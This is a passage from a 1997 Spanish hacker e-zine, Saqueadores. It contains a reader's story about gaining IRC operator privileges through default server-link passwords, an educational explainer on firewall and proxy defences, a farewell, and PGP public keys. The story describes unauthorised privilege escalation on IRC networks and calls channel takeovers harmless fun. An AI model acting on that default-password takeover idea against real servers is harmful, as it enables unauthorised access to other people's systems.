Ya ves que no nos sienta mal el que no este encriptado :-) pero si lo
que vais a enviar es "sensible" la encriptacion es muy recomendable, de
hecho y dependiendo de la direccion a la que escribais **el correo se
encripta automaticamente por el camino**, ventajas de Inet ;-)


Y para finalizar esta seccion otra muestra mas de uno de los lectores
que nos escribe y ademas aporta algo, en este caso un relato, de
Smokkoms <smokkoms@hotmail.com>

----------------------------------------------------------------------------

Estimado Paseante :
No soy ni me considero hacker, pero admiro a la gente que lo es,
principalmente porque se lo dificil y duro que es conseguirlo.
Te mando este relato que puede ser o no creible y que puedes o no
editarlo en saqueadores, revista que leo cuando puedo y que me
parece un buen trabajo. Se que vuestra situacion actual no es de
las mejores, pero os deseo la mejor de las suertes.

Un saludo.                               SmokkomS


- Frio en la nuca -
SmokkomS 24-6-1997.


3 de la maคana. Como siempre, estoy totalmente desvelado.
Veamos quien anda por ahi. Me apetece charlar un poco.
Conecto con el mirc a arrakis2 (permite acceder a traves
de diversos puertos, lo cual hace mas dificil el nukeo).
Activo un par de clones en zoom y en catalunya despues del
habitual /links.
Entro en #hackers y en un par de canales mas al azar (no
es bueno estar solo en hackers, ya que se define claramente 
tu aficcion).
Sigue estando scytale (1), lo cual me hace pensar que cada vez 
se les va mas de las manos esto del chat a los supervisores.
Activo mi chequeo de splits.
No parece que haya mucho interesante en el canal, asi que despues
de pasar una lista de puertos a uno de los 'hackers' del canal,
me despido. 
Quiero probar algo nuevo. Quiero ser ircop (2). Eso no lo he hecho 
nunca.
Seguro que en alguno de los miles de scripts que todos tenemos, 
hemos visto alguna opcion de "gain oper" o "oper access".
Claro que, evidentemente ninguno hemos podido activar esa opcion.
Veamos, lo unico que me pide es un usuario y una password. Y claro,
vaya usted a saber...จgoku, goku? hmmm...por este camino no voy 
bien.
จCual sera la contraseคa que el server de irc trae por defecto?.
hmmmm...
Necesito un servidor de irc.
A navegar tocan.
En quince minutos tengo instalado un servidor irc en el pc que 
normalmente utilizo de 'pseudo - firewall'. Vaya, interesante.
El programa consta de un monton de opciones de configuracion con 
las cuales no pienso aburriros, pero si decir que existen dos 
opciones muy interesantes...
Vayamos por la primera : Acceso de ircops. Permite definir la mascara
de acceso, el UID y la contraseคa. Bien. Viene un UID y una contraseคa
por defecto. Seguro que alguno de los servers tiene activado este user.
A probar.
Increible.
No puede ser.
NINGUNO tiene ese usuario.
Vaya.
Esto no puede ser cierto.
Algo he hecho mal.
Vuelvo a mi servidor irc, y empiezo a trastear con la opcion de 
operadores.
JE!, ahora lo entiendo. Al crear un nuevo operador el programa me
da un nuevo UID y una nueva contraseคa totalmente aleatoria, o sea
que es logico que no se haya mantenido la primera en ninguno de los
servers. 
Vaya, por aqui hay poco que rascar.
Solo nos queda la segunda opcion del server...los servidores remotos.
Empiezo a trastear.
Vaya, esta opcion si mantiene la contraseคa...
Empiezo a preguntarme :
Si yo intento conectarme a uno de los servidores de la red y este
ha conservado la contraseคa por defecto... podria conectarme a MI
servidor del que SI conozco el UID y la contraseคa para 'ganar' 
privilegios de operador que serian validos en toda la red de irc...
Pero claro, esta conexion es facilmente detectable por cualquiera de
los operadores que esten supervisando...Si espero a que no haya 
ninguno (cosa bastante habitual a esta horas...) y activo mi 
'firewall'...

Comienzo a sentir frio en la nuca...

Para despedirme solo decir que es realmente gracioso leer las reacciones
de los 'dueคos' de un canal cuando alguien entra, gana privilegios y 
anula los suyos, eso si, volviendo a dejar todo como estaba al poco rato
y sin animo de maldad.


(1) Scytale es un boot que los ircops integran en un canal para
que detecte a los usuarios habituales, los proteja de bans y 
kicks masivos, les de privilegios, etc..., pero tambien sirve
para tener el log del canal, o sea, que Scytale se encarga de 
almacenar todo lo que se dice en ese canal (publicamente claro).

(2) Ser ircop significa ser operador de irc (seguro que os suena 
goku), esto permite, por ejemplo, entrar en un canal y darte a ti
mismo privilegios o quitarselos a quien quieras, puedes provocar
un kill a un usuario, un k-line, un g-line, o incluso la desconexion
del servidor a la red del irc.
------------------------------------------------------------------------

Esta ha sido una pequeคa muestra de los mensajes que hemos recibido este
ultimo mes, aparte por supuesto de los habituales mensajes de colaboradores
o aspirantes a serlo, a todos aquellos que han escrito para darnos su
apoyo. Gracias.!


                       


ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 15. FIREWALLS Y PROXYS II                                                 บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Hola y Bienvenidos.

En el anterior numero de Saqueadores vimos que es y para que sirve un
firewall y un proxy, tambien dimos un repaso a las principales
caracteristicas de una aplicacion proxy, vamos a ver a continuacion algunas
de las tecnicas implementadas para defender una intranet, no estan todas las
que son ni son todas las que estan pero da una buena idea de los metodos de
defensa que puede tener una intranet bien protegida.

Todo ello es con caracter meramente divulgativo.



Introduccion

Cuando se habla del sistema de seguridad de una red de ordenadores se tienen
que tener en cuenta varios aspectos en su diseคo, un mecanismo de proteccion
como el firewall no debe proteger solo la red interior, debe ser capaz de
protegerse A SI MISMO.
Hay distintos mecanismos para proteger por un lado al firewall y por otro a
la red a la que sirve de guardian, en algunos casos estos mecanismos son
comunes.
Asi en este capitulo vamos a explicar alguna de las maneras en que un
firewall se protege a si mismo y como protege a los sistemas a el conectados,
veremos los principios de diseคo y operativos de estos sistemas de proteccion.
Con intencion educativa, repito.



Fundamentos de Seguridad

Es decir los principios generales en los que debe basarse el diseคo de un
sistema de seguridad (sea proxy o firewall)

Politica principal: Todo aquello que no esta expresamente permitido esta
prohibido

Politica de Diseคo: Encaminada a la minimizacion y la simplicidad (Lo bueno
si breve dos veces bueno)

Politica de Escepticismo: Tras dotar al firewall de todas las protecciones
disponibles se toma en consideracion que se pueden desarrollar nuevas
tecnicas y que ningun grado de seguridad es absoluto.


--- Proteccion del Host Firewall--


La solucion Turnkey

Solo se permite el login del administrador, los usuarios solo pueden hacer
login en la red protegida o via consola.
Cualquier programa o utilidad innecesaria o potencialmente peligrosa es
desinstalada.


Aclaraciones de Paseante
------------------------------------------------------
Siguiendo con el caracter meramente informativo, aquก vienen alguna de las
acciones que activan la notificacion de alarma:

- Intento de acceso a puertos restringidos
- Intento de acceso a cualquier puerto superior al 1024

Y ahora aquello de lo que se hace logging.

- Registro de todos los paquetes rechazados
- Registro de todos los procesos de login que han sido incorrectos
- Registro de todos los host externos cuya direccion IP no coincide con
  el DNS enviado al firewall
----------------------------------------------------------

Restriccion de acceso al Firewall

No se permite cuentas de usuario en ningun ordenador que ejerza de firewall
No se permiten logins desde el exterior al firewall
Las cuentas de super-usuario solo se pueden activar desde la consola del
sistema
En caso de muro-doble (ver mas abajo) ni siquiera el administrador tiene
derecho a utilizar la red privada que comunica los dos muros.
Un programa se encarga de manera regular de chequear la integridad del
sistema
Para efectuar un cambio de configuracion del sistema se requiere un 'reboot'
Y para acabar, algunos modelos tambin gozan de protecciones fisicas.


--Proteccion de la red interior--


IP spoofing

Se previene el ataque mediante IP spoofing desde cualquiera de los dos lados
del firewall.


Sistemas de Una Mision

Utilizan hardware y software para implementar un firewall que solo tiene una
funcion: la seguridad y una mision: proteger a la red, en lugar de
conformarse con una aplicacion de soft se intenta elevar el nivel de
proteccion con un sistema dedicado

Aclaraciones de Paseante
-----------------------------------------------
Esta solucion (tener un host dedicado) es dada de lado por muchas empresas
por el coste que supone dedicar una maquina bastante cara a la tarea exclusiva
de proteger la red, evidentemente el nivel de proteccion de esas redes es
menor.
-------------------------------------------------



Construcciones de Muro Doble

Los firewalls se construyen con la tecnica de "muro doble", en este caso el
firewall consta de dos sistemas separados fisicamente (muro exterior e
interior) conectados por una red privada (tipo DMZ por ejemplo), si alguien
es capaz de comprometer el muro exterior el muro interior protege la red
cortando su red DMZ y aislando la red interior.

Aclaraciones de Paseante
-------------------------------------------------------
El muro interior se rige por el "pesimismo", solo acepta paquetes si
responden a una peticion originada en el interior de la red o provienen de
uno de sus proxies, por descontado guarda toda la informacion sobre las
transacciones.
จY si llega otro paquete que no viene de ninguna de esas dos fuentes?. En
ese caso se pone a la defensiva de modo espectacular, de manera inmediata
corta la red privada que le une al muro exterior y alerta sobre una violacion
de seguridad critica (quizas un poquito exagerado pero funciona)
จQue? จQue os parece el truquillo?. Lo ponen dificil pero la logica es muy
asumible, en un sistema con un solo firewall si lo comprometes ganas acceso a
toda la red, en este caso lo unico que ganas es aislar la red (aunque puede
que sea eso lo que busques)
------------------------------------------------------------




Acceso transparente a la red

Los firewalls ofrecen acceso transparente a la red externa a las aplicaciones TCP/IP
del interior de la red, esto significa que tanto los Pc como Macs y sistemas
UNIX operan normalmente a traves del firewall.
Aplicaciones comunes como Telnet, Ftp, Gopher y browsers WWW se pueden
utilizar sin modificarse asi como aplicaciones adicionales (Archie, Ping,
Directorio X-500..).
Esto elimina todo lo que hemos visto de utilizar proxies aunque lo mas
utilizado siga siendo el ejecutar proxies conviene saber que existe esto y es
que los fabricantes no descansan. ;)


Clave de un solo uso

Ya lo hemos visto antes, uno de los principales medios de entrar en una red
es conseguir burlar el sistema de passwords por lo que ante la casi certeza
de que a algun usuario le "birlarian" la clave tarde o temprano se opta por
usar claves que no se pueden 're-utilizar' del tipo pregunta-respuesta
(S/Key, Digital Pathways, CRYPTOCard..)


Ocultacion de Dominios

El firewall oculta el dominio interno de la red protegida, si se posee un
"muro doble" la unica parte que expone su dominio es el "muro exterior", esto
no interfiere en permitir que se realice e-mail, telnet y otros servicios
aprobados hacia la red interna.
De manera adicional el correo enviado desde la red interna sera "despojado"
de la informacion comprometedora (con respecto a host y DNS) que podria dar
a un potencial atacante una idea de la configuracion interior de la red.


Traduccion de Direcciones de Red

Todas las direcciones IP internas son traducidas o remapeadas a la direccion
IP del firewall expuesto. จQue significa esto?. Pues que todos los paquetes
de datos que se originan dentro de la red aparecen como provinientes del
firewall, esto permite que una empresa registre una sola direccion IP y que
luego internamente use todas las que quiera.


Filtrado Inteligente de Paquetes

Todos los paquetes dirigidos hacia el firewall son inteligentemente (supongo
que con una inteligencia limitada :) ) filtrados para impedir el acceso a
puertos no autorizados, se permite la conexion solo a hosts autorizados y el
administrador puede conceder o denegar acceso de manera amplia hasta
combinaciones especificas de host/puerto.
(O sea que puede prohibir a todo el mundo usar el puerto x, o solo al host
tal, o solo el host x puede usar el puerto z... toda la gama)


Logging

Una de las primeras cosas que hace un hacker cuando consigue entrar en un
sistema es alterar o destruir el sistema de login, ellos lo saben asi que
vuelven a la carga con la tecnica del muro doble y algo que llaman "drop
safe logging" que consiste mas o menos en que el log se mantiene en el muro
interior a salvo del atacante que solo "ve" el muro exterior, asimismo el
log se puede redirigir a impresoras o cintas de backup y por supuesto dota al
administrador de elevadas capacidades para ver, controlar y monitorizar
diversos usos del sistema.

Eso es todo, amigos.





                        

ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 16. DESPEDIDA                                                             บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


 Otro numero mas finalizado...parece que fue ayer pero estamos a punto
 de cumplir nuestro primer aniversario, con mas contenidos que nunca, con
 mas colaboradores que nunca y mas fuertes que nunca tras la experiencia
 por la que hemos pasado este ultimo mes.
 En estos momentos somos la revista electronica under mas leida de Espaคa
 asi de claro, parece extraคo pero es simple, muchos otros proyectos de
 revista se han ido quedando en el camino, falta de ganas, de tiempo, de
 resultados.. quien sabe?. Una lastima en todo caso por que todos ellos
 iban en la misma direccion que nosotros. COMPARTIR EL CONOCIMIENTO.
 Ya son demasiados aคos de lobos solitarios y grupitos aislados, aunque
 se siga actuando asi por precaucion o comodidad no habia excusa para no
 comenzar a darle una oportunidad a la gente que queria aprender, no
 habia excusa para seguir encerrados en nuestros cuchitriles de hackadicto.
 Aqui estamos y aqui seguiremos bajo esta u otra forma.
 El tiempo dira.
 Y de momento nos dice que el numero 11 deberia verse alla por mediados o
 finales de septiembre. :-).
 Hasta entonces.







Y recordad, hagais lo que hagais.
Tened cuidado ahi fuera.

Paseante <paseante@geocities.com>

 ***************************************************************************
 * Esta revista se distribuye libremente, te autorizamos a que tu tambien  *
 * lo hagas siempre que no modifiques el ธ y el disclaimer,los miembros de *
 * las fuerzas y cuerpos de seguridad del Estado deben pagar 950 pts para  *
 * poder leer la revista asi como todos los funcionarios del Ministerio y  *
 * las Consejerias de Interior y trabajadores o miembros de la BSA, este   *
 * pago se puede hacer cediendo a Saqueadores espacio Web, FTP, o visitando*      
 * nuestra homepage para darnos Geopoints y siempre que las visitas sean   *
 * validas segun las normas de Geocities al respecto.                      *                            *
 ***************************************************************************




Llaves PGP:
- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -
Type Bits/KeyID    Date       User ID
pub  1024/3359D401 1997/02/11 el duke de sicilia

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.6.3ia

mQCNAzMAj4EAAAEEAJyNgoO6YzU+PZvbwsSH9AHhNNtLPyPF15rUtb9TcH/82rzv
3l6wETMcwNX/4dumsKDjz3iwl5JN+V5AYiIg4JDi5otbrkk6imjtMUMSXnsriw9a
0noSvw9guDC+JR8NDNPS+M8PpdcFBtQIv88oJF3JLWO/P9m6XX1rjOwzWdQBAAUR
tBJlbCBkdWtlIGRlIHNpY2lsaWE=
=R8Us
-----END PGP PUBLIC KEY BLOCK-----

- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -
Tipo Bits/Clave    Fecha      Identificador
pub  1024/AF12D401 1997/02/19 Paseante <paseante@geocities.com>

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.6.3ia

mQCNAjMK8d4AAAEEAL4kqbSDJ8C60RvWH7MG/b27Xn06fgr1+ieeBHyWwIIQlGkI
ljyNvYzLToiS+7KqNMUMoASBRC80RSb8cwBJCa+d1yfRlkUMop2IaXoPRzXtn5xp
7aEfjV2PP95/A1612KyoTV4V2jpSeQZBUn3wryD1K20a5H+ngbPnIf+vEtQBAAUT
tCFQYXNlYW50ZSA8cGFzZWFudGVAZ2VvY2l0aWVzLmNvbT6JAJUDBRAzn9+Js+ch
/68S1AEBAZUfBACCM+X7hYGSoYeZVLallf5ZMXb4UST2R+a6qcp74/N8PI5H18RR
GS8N1hpYTWItB1Yt2NLlxih1RX9vGymZqj3TRAGQmojzLCSpdSlJBVV5v4eCTvU/
qX2bZIxsBVwxoQP3yzp0v5cuOhIoAzvTl1UM/sE46ej4da6uT1B2UQ7bOQ==
=ukog
-----END PGP PUBLIC KEY BLOCK-----

- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -

Tipo Bits/Clave    Fecha      Identificador
pub  2048/E61E7135 1997/06/12 El Profesor Falken

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.6.3ia

mQENAzOfm6IAAAEIALRSXW1Sc5UwZpm/EFI5iS2ZEHu9NGEG+csmskxe58HukofS
QxZPofr4r0RGgR+1uboKxPDJj7n/knoGbvt+ndtB9pPiIhNpM9YkQDyovOaQbUn0
kLRTaHAJNf1C2C66CxEJdZl9GkNEPjzRaVo0o5DTZef/7suVN7u6OPL00Zw/tsJC
FvmHdcM5SnNfzAndYKcMMcf7ug4eKiLIlhaAVDO+N/iTXuE5vmvVjDdnqoGUX7oQ
S+nOf9eQLQg1oUPzURGNm0i+XkJvSeKogKCNaQe5XGGOYLWCGsSbnV+6F0UENiBD
bSz1SPSvpes8LYOGXRYXoOSEGd6Nrqro5eYecTUABRG0EkVsIFByb2Zlc29yIEZh
bGtlbokBFQMFEDOfm6auqujl5h5xNQEBOFIH/jdsjeDDv3TE/1rclgewoL9phU3K
KS9B3a3az2/KmFDqWTxy/IU7myozYU6ZN9oiDi4UKJDjsNBwjKgYYCFA8BbdURJY
rLgo73JMopivOK6kSL0fjVihNGFDbrlGYRuTZnrwboJNJdnpl2HHqTM+MmkV/KNk
3CsErbZHOx/QMJYhYE+lAGb7dkmNjeifvWO2foaCDHL3dIA2zb26pf2jgBdk6hY7
ImxY5U4M1YYxvZITVyxZPjUYiQYA4zDDEu+fO9ZDBlKu0vtx++w4BKV5+SRwLLjq
XU8w9n5fY4laVSxTq2JlJXWmdeeR2m+8qRZ8GXsGQj2nXvOwVVs080AccS4=
=6czA
-----END PGP PUBLIC KEY BLOCK-----
- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -- - -

"La violencia y el asesinato no son la respuesta, son el problema"

MABG y otras 814 victimas, descansad en paz.


ธ Saqueadores. 1996-7






